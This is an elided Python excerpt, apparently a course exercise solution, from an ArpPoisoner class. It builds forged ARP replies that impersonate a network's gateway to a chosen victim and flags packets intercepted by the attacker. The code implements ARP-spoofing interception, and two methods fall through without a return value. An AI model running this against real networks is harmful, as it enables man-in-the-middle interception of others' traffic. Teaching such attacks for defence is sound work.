...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet):
        ...
        """
        if(self.our_ip != packet[S.IP].src and self.gateway_mac == packet[S.Ether].dst):
            return True
        else:
            False
    ...
    def is_stolen_packet(self, packet):
        ...
        Note: You may assume all packets have both IP and Ethernet layers.
        """
        if(self.our_ip!=packet[S.IP].dst and self.our_mac == packet[S.Ether].dst):
            return True
        else :
            False
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        return S.ARP(op =S.ARP.is_at ,psrc = self.gateway_ip ,pdst = victim_packet[S.IP].src,hwsrc = self.our_mac ,hwdst = victim_packet[S.Ether].src) 
